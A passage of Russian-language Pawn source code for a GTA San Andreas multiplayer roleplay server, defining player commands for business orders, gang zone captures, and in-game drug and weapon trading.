				strmid(ProductInfo[TOTALPRODUCT][pName],PlayerInfo[playerid][pSendername],0,strlen(PlayerInfo[playerid][pSendername]),MAX_PLAYER_NAME);
				ProductInfo[TOTALPRODUCT][pPrice] = till*23;
				ProductInfo[TOTALPRODUCT][pTill] = till;
				ProductInfo[TOTALPRODUCT][pBizzid] = idx;
				ProductInfo[TOTALPRODUCT][pStatus] = false;
				BizzInfo[idx][bMoney] -= ProductInfo[TOTALPRODUCT][pPrice];
				SendMes(playerid, TEAM_BLUE_COLOR, "Вы заказали %i товаров для закуски, Снято со счета бизнеса: %i долларов.", till, ProductInfo[TOTALPRODUCT][pPrice]);
				for(new p = 0; p < MAX_PLAYERS; p++)
				{
					if(!IsPlayerConnected(p) || PlayerLogged[p] == 0 || PlayerInfo[p][pJob] != J_PRODUCT) continue;
					SendMes(p,  COLOR_ALLDEPT, "Поступил новый заказ закуски от %s. Используйте: /plist у склада", PlayerInfo[playerid][pSendername]);
				}
			}
			if(BizzInfo[idx][bType] == 4 || BizzInfo[idx][bType] == 5)
			{
				if(till < 1000 || till > 7000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Закажите более меньшую сумму, лимит бизнеса 3000п.");
				if(BizzInfo[idx][bMoney] < till*24) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBank);
				TOTALPRODUCT++;
				strmid(ProductInfo[TOTALPRODUCT][pName],PlayerInfo[playerid][pSendername],0,strlen(PlayerInfo[playerid][pSendername]),MAX_PLAYER_NAME);
				ProductInfo[TOTALPRODUCT][pPrice] = till*24;
				ProductInfo[TOTALPRODUCT][pTill] = till;
				ProductInfo[TOTALPRODUCT][pBizzid] = idx;
				ProductInfo[TOTALPRODUCT][pStatus] = false;
				BizzInfo[idx][bMoney] -= ProductInfo[TOTALPRODUCT][pPrice];
				SendMes(playerid, TEAM_BLUE_COLOR, "Вы заказали %i товаров для клуба/бара, Снято со счета бизнеса: %i долларов.", till, ProductInfo[TOTALPRODUCT][pPrice]);
				for(new p = 0; p < MAX_PLAYERS; p++)
				{
					if(!IsPlayerConnected(p) || PlayerLogged[p] == 0 || PlayerInfo[p][pJob] != J_PRODUCT) continue;
					SendMes(p,  COLOR_ALLDEPT, "Поступил новый заказ клуба/бара от %s. Используйте: /plist у склада", PlayerInfo[playerid][pSendername]);
				}
			}
			if(BizzInfo[idx][bType] == 6)
			{
				if(till < 1000 || till > 20000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Закажите более меньшую сумму, лимит бизнеса 3000п.");
				if(BizzInfo[idx][bMoney] < till*20) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBank);
				TOTALPRODUCT++;
				strmid(ProductInfo[TOTALPRODUCT][pName],PlayerInfo[playerid][pSendername],0,strlen(PlayerInfo[playerid][pSendername]),MAX_PLAYER_NAME);
				ProductInfo[TOTALPRODUCT][pPrice] = till*20;
				ProductInfo[TOTALPRODUCT][pTill] = till;
				ProductInfo[TOTALPRODUCT][pBizzid] = idx;
				ProductInfo[TOTALPRODUCT][pStatus] = false;
				BizzInfo[idx][bMoney] -= ProductInfo[TOTALPRODUCT][pPrice];
				SendMes(playerid, TEAM_BLUE_COLOR, "Вы заказали %i БП для аммо магазина, Снято со счета бизнеса: %i долларов.", till, ProductInfo[TOTALPRODUCT][pPrice]);
				for(new p = 0; p < MAX_PLAYERS; p++)
				{
					if(!IsPlayerConnected(p) || PlayerLogged[p] == 0 || PlayerInfo[p][pJob] != J_PRODUCT) continue;
					SendMes(p,  COLOR_ALLDEPT, "Поступил новый заказ бп от %s. Используйте: /plist у склада", PlayerInfo[playerid][pSendername]);
				}
			}
			if(BizzInfo[idx][bType] == 7)
			{
				if(till < 1000 || till > 20000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Закажите более меньшую сумму, лимит бизнеса 5000п.");
				if(BizzInfo[idx][bMoney] < till*20) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBank);
				TOTALPRODUCT++;
				strmid(ProductInfo[TOTALPRODUCT][pName],PlayerInfo[playerid][pSendername],0,strlen(PlayerInfo[playerid][pSendername]),MAX_PLAYER_NAME);
				ProductInfo[TOTALPRODUCT][pPrice] = till*20;
				ProductInfo[TOTALPRODUCT][pTill] = till;
				ProductInfo[TOTALPRODUCT][pBizzid] = idx;
				ProductInfo[TOTALPRODUCT][pStatus] = false;
				BizzInfo[idx][bMoney] -= ProductInfo[TOTALPRODUCT][pPrice];
				SendMes(playerid, TEAM_BLUE_COLOR, "Вы заказали %i запчастей для СТО, Снято со счета бизнеса: %i долларов.", till, ProductInfo[TOTALPRODUCT][pPrice]);
				for(new p = 0; p < MAX_PLAYERS; p++)
				{
					if(!IsPlayerConnected(p) || PlayerLogged[p] == 0 || PlayerInfo[p][pJob] != J_PRODUCT) continue;
					SendMes(p,  COLOR_ALLDEPT, "Поступил новый заказ запчастей от %s. Используйте: /plist у склада", PlayerInfo[playerid][pSendername]);
				}
			}
			else SendClientMessage(playerid, COLOR_WHITE, "Вы уже сделали заказ!");
		}
	}
	else SendClientMessage(playerid, COLOR_WHITE, "Вы далеко от склада (Порт ЛС)!");
	return true;
}
CMD:animlist(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	ShowPlayerDialog(playerid,D_JOB+136,DIALOG_STYLE_LIST, "Анимации сервера", "1. Танец (1)\n2. Танец (2)\n3. Танец (3)\n4. Танец (4)\n5. Руки вверх\n6. Курить\n7. Возмущение\n8. Сесть\n9. Лежать (1)\n10. Лежать (2)\n11. Жест рукой\n12. Зивать \n13. Танец (5)\n14. Танец (6)\n15. Танец (7)\n16. Танец (8)\n17. Танец (9)\n18. Танец(10)\n19. Сесть\n20. Дилер\n21. Дилер (2)\n22. Дилер (3)\n23. Дилер (4)\n24. Пьяная походка\n25. Сесть (2)", "Выбрать", "Отмена");
	return true;
}
CMD:materials(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMember] == F_ARMY || IsAGang(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 8.0, 331.4276,1963.4594,17.3887))
		{
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем транспорта!");
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 433) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в матовозе!");
			ShowPlayerDialog(playerid, D_JOB+2, 2, "материалы", "Загрузить материалы\nЗагрузить материалы для ЛСПД\nЗагрузить материалы для СФПД\nЗагрузить материалы для ФБР\n{FF6347}Выгрузить материалы", "Принять", "Отмена");
		}
		else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться у склада LVA!");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:fstyle(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	{
		if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /fstyle  [1,2,3]");
		if(params[0] == 1)
		{
			if(PlayerInfo[playerid][pSportEXP] >= 5000)
			{
				SetPlayerFightingStyle(playerid, PlayerInfo[playerid][pFightStyle]=5);
			}
			else{SendClientMessage(playerid, COLOR_WHITE, "Вы еще не выучили этот стиль боя!");}
		}
		if(params[0] == 2)
		{
			if(PlayerInfo[playerid][pSportEXP] >= 10000)
			{
				SetPlayerFightingStyle(playerid, PlayerInfo[playerid][pFightStyle]=6);
			}
			else{SendClientMessage(playerid, COLOR_WHITE, "Вы еще не выучили этот стиль боя!");}
		}
		if(params[0] == 3)
		{
			if(PlayerInfo[playerid][pSportEXP] >= 15000)
			{
				SetPlayerFightingStyle(playerid, PlayerInfo[playerid][pFightStyle]=7);
			}
			else{SendClientMessage(playerid, COLOR_WHITE, "Вы еще не выучили этот стиль боя!");}
		}
	}
	return true;
}
CMD:gate(playerid, params[])
{
	if(IsPlayerInRangeOfPoint(playerid, 12.0,285.6758,1821.0135,17.6406))
	{
		if(PlayerInfo[playerid][pMember] == F_ARMY)
		{
			MoveObject(vorota,285.62500000,1811.20446777,18.36432266,3.0,0.00000000,0.00000000,270.00000000);
			MoveObject(vorota2,285.62500000,1830.82177734,18.27965546,3.0,0.00000000,0.00000000,270.00000000);
			SetTimer("GatePex", 4000, 0);
			SendMes(playerid, COLOR_BLUE, "Ворота открыты на 7 секунд.");
		}
	}
	return true;
}
CMD:gatefbi(playerid, params[])
{
	if(IsPlayerInRangeOfPoint(playerid, 12.0,-1946.0976,-1015.3544,35.0999))
	{
		if(PlayerInfo[playerid][pMember] == F_FBI)
		{
			MoveObject(vorota3,-1946.0980, -1015.3549, 40.5,3.0,0.00000000,0.00000000,0.00000000);
			SetTimer("GateFBI", 5000, 0);
			SendMes(playerid, COLOR_BLUE, "Ворота открыты на 7 секунд.");
		}
	}
	return true;
}
CMD:capture(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsAGang(playerid))
	{
		if(PlayerInfo[playerid][pRank] < 7) return SendClientMessage(playerid,COLOR_LIGHTRED,"Функция доступная с 7 ранга и выше!");
		new faction = PlayerInfo[playerid][pMember];
		if(FrakCD > 0) return SendClientMessage(playerid, COLOR_GREY, "Захватывать зону можно 1 раз в 2 часа!");
		if(!IsInAllowed(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Ваша банда уже учавствует в захвате зон!");
		new string[256];
		for(new i = 1;i<=TOTALGZ;i++)
		{
			if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]) && ZoneOnBattle[i] == 0)
			{
				if(IsPlayerInAnyVehicle(playerid)) return  SendClientMessage(playerid, COLOR_GREY, "Нельзя использовать в машине");
				{
					if(GZInfo[i][gFrak] == faction) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете захватывать зону вашей банды!");
					if(IsCapture == 1) return SendClientMessage(playerid, COLOR_GREY, "Уже происходит захват одной из зон. Дождитесь окончания!");
					if(IsPlayerInBandOnline(faction) < 0) return SendMes(playerid,COLOR_GREY, "В вашей банде мало игроков онлайн!");
					if(IsPlayerInBandOnline(GZInfo[i][gFrak]) < 0) return SendMes(playerid,COLOR_GREY, "У банды \"%s\" мало игроков!", GetGangName(GZInfo[i][gFrak]));
					new zahvatka[128];
					format(zahvatka, 127,"[F] Ваша зона атакуется бандой %s, у вас есть 5 минут, чтобы отбиться", FracInfo[PlayerInfo[playerid][pMember]][fName]);
					SendFMes(GZInfo[i][gFrak],COLOR_LIGHTRED,zahvatka);
					format(string, 127, "[F] Если по истечению времени вас не будет на зоне, она перейдет к %s",FracInfo[PlayerInfo[playerid][pMember]][fName]);
					SendFMes(GZInfo[i][gFrak],COLOR_LIGHTRED,string);
					//------------------------------------
					new zahvat[128];
					format(zahvat,128,"[F] %s начал захват зоны банды %s. У вас есть 5 минут, чтобы отбиться.",sendername(playerid),GetGangName(GZInfo[i][gFrak]));
					SendFMes(faction,COLOR_LIGHTRED,zahvat);
					GangZoneFlashForAll(GZInfo[i][id],GetGZColorF(faction));
					GZSafeTime[i] = 300;
					FrakCD  = 10800;
					GZInfo[i][gNapad] = faction;
					ZoneOnBattle[i] = 1;
					IsCapture=1;
					GangInfo[faction][capture] = 1;
					GangInfo[GZInfo[i][gFrak]][capture] = 1;
					GangInfo[GZInfo[i][gFrak]][captureid] = faction;
					GangInfo[faction][captureid] = faction;
					GangInfo[faction][gangnumber] = 1;
					GangInfo[GZInfo[i][gFrak]][gangnumber] = 0;
					CaptureStart(faction, GZInfo[i][gFrak]);
				}
			}
		}
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:warehouse(playerid, params[]){
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMember] == F_ARMY){
		format(totalstring, 512,
		"{ffffff}Металла на складе: {9ACD32}\t\t%i / 100000 {ffffff}кг\n\n{ffffff}материалов на складе: {9ACD32}\t\t%i / 500000\n\
		{ffffff}материалов (ЛСПД): {9ACD32}\t\t%i / 100000\n{ffffff}материалов (СФПД): {9ACD32}\t\t%i / 100000\n{ffffff}материалов (ФБР): {9ACD32}\t\t%i / 100000\n", Metal,Mats[0], Mats[1], Mats[2], Mats[4]);
		ShowPlayerDialog(playerid, D_NULL, 0, "{ffffff}", totalstring, "Закрыть", "");}
	else if(IsAGang(playerid)){
		if(PlayerInfo[playerid][pMember] == F_GROVE) SendMes(playerid, COLOR_GREEN, "Eдиниц оружия на складе Grove Street Gang: {ffffff}%i / 100000", Mats[5]);
		else if(PlayerInfo[playerid][pMember] == F_BALLAS) SendMes(playerid, 0xD900D3C8, "Eдиниц оружия на складе The Ballas Gang: {ffffff}%i / 100000", Mats[6]);
		else if(PlayerInfo[playerid][pMember] == F_RIFA) SendMes(playerid, 0x83BFBFAA, "Eдиниц оружия на складе The Rifa Gang: {ffffff}%i / 100000", Mats[7]);
		else if(PlayerInfo[playerid][pMember] == F_AZTECAS) SendMes(playerid, 0x01FCFFC8, "Eдиниц оружия на складе Varios Los Aztecas Gang: {ffffff}%i / 100000", Mats[8]);
		else if(PlayerInfo[playerid][pMember] == F_VAGOS) SendMes(playerid, COLOR_ORANGE, "Eдиниц оружия на складе Los Santos Vagos Gang: {ffffff}%i / 100000", Mats[9]);}
	else if(IsAMafia(playerid)){
		new mats;
		if(IsAGang(playerid)) mats = PlayerInfo[playerid][pMember]-3;
		if(IsAMafia(playerid)) mats = PlayerInfo[playerid][pMember];
		format(totalstring, 256, "{ffffff}Организация:\t\t\t\t{ffff00}%s\n\n{ffffff}материалов на складе:\t\t{ffff00}%i",FracInfo[PlayerInfo[playerid][pMember]][fName], Mats[mats]);
		ShowPlayerDialog(playerid, D_NULL, 0, "{ffffff}", totalstring, "Закрыть", "");}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;}
CMD:setmats(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsAGang(playerid))
	{
		if(PlayerInfo[playerid][pRank] < 3) return SendClientMessage(playerid, COLOR_GREY, "Функция доступна с 3 ранга и выше!");
		if(PlayerInfo[playerid][pMember] == F_GROVE && !IsPlayerInRangeOfPoint(playerid, 50.0, 2505.8108,-1688.8950,13.5550)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться на складе банды! (Около респы организации)");
		if(PlayerInfo[playerid][pMember] == F_BALLAS && !IsPlayerInRangeOfPoint(playerid, 50.0, 2644.8088,-2037.9858,13.5500)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться на складе банды! (Около респы организации)");
		if(PlayerInfo[playerid][pMember] == F_RIFA && !IsPlayerInRangeOfPoint(playerid, 50.0, 2180.7810,-1810.4222,13.3759)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться на складе банды! (Около респы организации)");
		if(PlayerInfo[playerid][pMember] == F_AZTECAS && !IsPlayerInRangeOfPoint(playerid, 50.0,1667.2631,-2113.3047,13.5469)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться на складе банды! (Около респы организации)");
		if(PlayerInfo[playerid][pMember] == F_VAGOS && !IsPlayerInRangeOfPoint(playerid, 50.0, 2767.6528,-1610.7498,10.9219)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться на складе банды! (Около респы организации)");
		if(IsAGang(playerid)) ShowPlayerDialog(playerid, D_JOB+10, 2, "Склад Банды", "Взять материалы\nПоложить материалы на склад\nЗагрузить материалы в грузовик\nВыгрузить материалы из грузовика\nВзять оружее со склада", "Принять", "Отмена");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:getguns(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsAGang(playerid))
	{
		if(PlayerInfo[playerid][pRank] < 3) return SendClientMessage(playerid, COLOR_GREY, "Функция доступна с 3 ранга и выше!");
		if(PlayerInfo[playerid][pMember] == F_GROVE && !IsPlayerInRangeOfPoint(playerid, 50.0, 2505.8108,-1688.8950,13.5550)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться на складе банды! (Около респы организации)");
		if(PlayerInfo[playerid][pMember] == F_BALLAS && !IsPlayerInRangeOfPoint(playerid, 50.0, 2644.8088,-2037.9858,13.5500)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться на складе банды! (Около респы организации)");
		if(PlayerInfo[playerid][pMember] == F_RIFA && !IsPlayerInRangeOfPoint(playerid, 50.0, 2180.7810,-1810.4222,13.3759)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться на складе банды! (Около респы организации)");
		if(PlayerInfo[playerid][pMember] == F_AZTECAS && !IsPlayerInRangeOfPoint(playerid, 50.0,1667.2631,-2113.3047,13.5469)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться на складе банды! (Около респы организации)");
		if(PlayerInfo[playerid][pMember] == F_VAGOS && !IsPlayerInRangeOfPoint(playerid, 50.0, 2767.6528,-1610.7498,10.9219)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться на складе банды! (Около респы организации)");
		if(IsAGang(playerid)) ShowPlayerDialog(playerid, D_JOB+112, 2, "Склад Банды", "• Desert Eagle [150 патронов]\n• M4A1 [200 патронов]\n• AK47 [200 патронов]\n• Shotgun [50 патронов]", "Принять", "Отмена");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:hi(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsAMafia(playerid) || IsAGang(playerid) || PlayerInfo[playerid][pAdmin] != 0)
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /hi [id игрока]");
		if(!IsPlayerInRangeOfPlayer(2.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
		new Float:angle, string[64];
		GetPlayerFacingAngle(playerid, angle);
		SetPlayerFacingAngle(params[0], angle + 180);
		format(string, 63, "*%s пожал руку %s", PlayerInfo[playerid][pSendername] ,PlayerInfo[params[0]][pSendername]);
		ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		ApplyAnimation(playerid,"GANGS","hndshkfa",4.0,0,0,0,0,0);
		ApplyAnimation(params[0],"GANGS","hndshkfa",4.0,0,0,0,0,0);
	}
	return true;
}
CMD:usedrugs(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pDrugs] <= 0) return SendClientMessage(playerid, COLOR_GREY, "У вас нет наркотиков!");
	if(GetPVarInt(playerid, "DrugsTime") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Употреблять наркотики можно раз в 2 минуты!");
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /usedrugs [грамм]");
	if(params[0] > 3) return SendMes(playerid, COLOR_GREY, "Кол-во наркотиков от 1 до 3, у вас %i на руках", PlayerInfo[playerid][pDrugs]);
	new Float:health;
	GetPlayerHealth(playerid, health);
	SetHealth(playerid, health+params[0]*20);
	GetPlayerHealth(playerid, health);
	if(health > 120) return SendClientMessage(playerid, -1,"Вам плохо от наркотиков, пожалуйста подождите");
	PlayerInfo[playerid][pDrugs] -= params[0];
	ApplyAnimation(playerid,"SMOKING","M_smk_drag",4.1,0,0,0,0,0);
	SendMes(playerid, COLOR_BLUE, "Наркотиков использовано: %i грамм", params[0]);
	SetTimerEx("DrugEffectGone", 120000, false, "i", playerid);
	SetPVarInt(playerid, "DrugsTime", gettime()+130);
	format(totalstring, 90, "%s употребил(а) наркотики", PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,totalstring);
	SetPlayerTime(playerid,17,0);
	SetPlayerDrunkLevel(playerid, 3000);
	SetPlayerWeather(playerid, -68);
	return true;
}
CMD:dropdrugs(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pDrugs] == 0) return SendClientMessage(playerid, COLOR_GREY, "У вас нет наркотиков!");
	PlayerInfo[playerid][pDrugs] = 0;
	new string[94];
	format(string, 90, "%s скинул(а) пакетик с неизвестным содержимым", PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,string);
	return true;
}
CMD:selldrugs(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsAGang(playerid))
	{
		if(PlayerInfo[playerid][pRank] < 3) return SendClientMessage(playerid, COLOR_GREY, "Функция доступна с 3 ранга и выше!");
		new full = 0;
		for(new i = 1;i<=TOTALGZ;i++)
		{
			if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]) && ZoneOnBattle[i] == 0)
			{
				if(GZInfo[i][gFrak] != PlayerInfo[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Продавать наркотики можно только на своих зонах!");
				if(sscanf(params, "uii", params[0], params[1], params[2])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /selldrugs [id игрока] [грамм] [цена]");
				if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
				if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
				if(params[1] < 1 || params[1] > 100) return SendClientMessage(playerid, COLOR_GREY, "Кол-во грамм от 1 до 100!");
				if(params[2] < 1 || params[2] > 20000) return SendClientMessage(playerid, COLOR_GREY, "Цена от 1 до 20000 доллара(ов)!");
				if(PlayerInfo[playerid][pDrugs] < params[1]) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно кол-во наркотиков!");
				SendMes(playerid, COLOR_BLUE, "Вы предложили %s'у купить наркотики (Грамм: %i). Цена: %i долларов", sendername(params[0]),params[1], params[2]);
				SendMes(params[0], COLOR_BLUE, "%s предложил вам купить оружие (Грамм: %i). Цена: %i долларов", PlayerInfo[playerid][pSendername],params[1], params[2]);
				format(totalstring, 127, "%s предложил вам купить наркотики (Грамм: %i). Цена: %i долларов", PlayerInfo[playerid][pSendername],params[1], params[2]);
				ShowPlayerDialog(params[0], D_JOB+129, 0, "Наркотики", totalstring, "Да", "Нет");
				SetPVarInt(params[0], "PlayerDrugs", playerid);
				SetPVarInt(params[0], "PlayerDrugsKG", params[1]);
				SetPVarInt(params[0], "DrugsPrice", params[2]);
				full++;
				break;
			}
		}
		if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Продавать наркотики можно только в гетто!");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:sellgun(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsAGang(playerid))
	{
		if(PlayerInfo[playerid][pRank] < 2) return SendClientMessage(playerid, COLOR_GREY, "Функция доступна с 3 ранга и выше!");
		new full = 0;
		for(new i = 1;i<=TOTALGZ;i++)
		{
			if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]) && ZoneOnBattle[i] == 0)
			{
				if(GZInfo[i][gFrak] != PlayerInfo[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Продавать оружие можно только на своих зонах!");
				if(sscanf(params, "uiii", params[0], params[1], params[2], params[3])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /sellgun [id игрока] [id оружия] [патроны] [цена]");
				if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
				if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
				if(params[1] == 24 || params[1] == 25 || params[1] == 29 || params[1] == 23 || params[1] == 30 || params[1] == 31 || params[1] == 33)
				{
					if(params[2] < 1 || params[2] > 999) return SendClientMessage(playerid, COLOR_GREY, "Кол-во патронов от 1 до 999!");
					if(params[3] < 1 || params[3] > 20000) return SendClientMessage(playerid, COLOR_GREY, "Цена от 1 до 20000 доллара(ов)!");
					if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
					if(PlayerInfo[playerid][pMats] < params[2]) return SendClientMessage(playerid, COLOR_GREY, "У вас недостаточно материалов!");
					//
					SendMes(playerid, COLOR_BLUE, "Вы предложили %s'у купить оружие %s (%i) с %i патронами. Цена: %i долларов", sendername(params[0]), WeaponNames[params[1]], params[1], params[2], params[3]);
					SendMes(params[0], COLOR_BLUE, "%s предложил вам купить оружие %s (%i) с %i патронами. Цена: %i долларов", PlayerInfo[playerid][pSendername], WeaponNames[params[1]], params[1], params[2], params[3]);
					format(totalstring, 127, "%s предложил вам купить оружие %s (%i) с %i патронами. Цена: %i долларов\n\nВы согласны?", PlayerInfo[playerid][pSendername],WeaponNames[params[1]], params[1], params[2], params[3]);
					ShowPlayerDialog(params[0], D_JOB+7, 0, "Оружие", totalstring, "Да", "Нет");
					SetPVarInt(params[0], "PlayerGun", playerid);
					SetPVarInt(params[0], "PlayerGun_", params[1]);
					SetPVarInt(params[0], "PlayerGAmmo", params[2]);
					SetPVarInt(params[0], "PlayerGPrice", params[3]);
					full++;
					break;
				}
				else return SendClientMessage(playerid, COLOR_GREY, "Неверный ID оружия! ID оружия: 23, 24, 25, 29, 30, 31, 33");
			}
		}
		if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Продавать оружие можно только в гетто!");
	}
	return true;
}
CMD:unloadmats(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsAGang(playerid))
	{
		if(PlayerInfo[playerid][pRank] < 7) return SendClientMessage(playerid,COLOR_LIGHTRED,"Функция доступная с 7 ранга и выше!");
		SendClientMessage(playerid, COLOR_GREY, "Функция сделана для передачи материалов мафиям.");
		ShowPlayerDialog(params[0], 12017, 0, "Выберите мафию","Yakuza\nLa Cosa Nostra\nRussian Mafia" , "Далее", "Отмена");
	}
	return true;
}
CMD:makegun(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsAMafia(playerid))
	{
		if(PlayerInfo[playerid][pRank] < 4) return SendClientMessage(playerid, COLOR_GREY, "Функция доступна с 4 ранга и выше!");
		if(sscanf(params, "uii", params[0], params[1], params[2])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /sellgun [id игрока] [id оружия] [патроны]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		new string[64];
		if(params[1] == 24 || params[1] == 25 || params[1] == 29 || params[1] == 23 || params[1] == 30 || params[1] == 31 || params[1] == 33)
		{
			if(params[2] < 1 || params[2] > 150) return SendClientMessage(playerid, COLOR_GREY, "Кол-во патронов от 1 до 150!");
			if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
			if(PlayerInfo[playerid][pMats] < params[2]) return SendClientMessage(playerid, COLOR_GREY, "У вас недостаточно материалов!");
			//
			if(PlayerInfo[params[0]][pLevel] <= 1) return SendMes(playerid,COLOR_YELLOW,"Продавать оружие игрокам 1 уровня запрещено!");
			PlayerInfo[playerid][pMats] -=params[2];
			GiveWeapon(params[0], params[1], params[2]);
			format(string, 63, "%s достал оружие и передал в руки %s",PlayerInfo[playerid][pSendername], PlayerInfo[params[0]][pSendername]);
			ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		}
		else return SendClientMessage(playerid, COLOR_GREY, "Неверный ID оружия! ID оружия: 23, 24, 25, 29, 30, 31, 33");
	}
	return true;
}
CMD:sellzone(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsAGang(playerid))
	{
		if(PlayerInfo[playerid][pLeader] > 0 || PlayerInfo[playerid][pMember] > 0 && strcmp(PlayerInfo[playerid][pSendername],FracInfo[PlayerInfo[playerid][pMember]][fAssistant],true) == 0)
		{
			new full = 0;
			for(new i = 1;i<=TOTALGZ;i++)
			{
				if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]) && ZoneOnBattle[i] == 0)
				{
					if(GZInfo[i][gFrak] != PlayerInfo[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете продать чужую зону!");
					if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /sellzone [id игрока] [цена]");
					if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
					if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
					if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете продать зону себе!");
					if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
					if(!IsAGang(params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен состоять в какой-нибудь банде!");
					if(PlayerInfo[params[0]][pLeader] > 0 || PlayerInfo[params[0]][pMember] > 0 && strcmp(sendername(params[0]),FracInfo[PlayerInfo[params[0]][pMember]][fAssistant],true) == 0)
					{
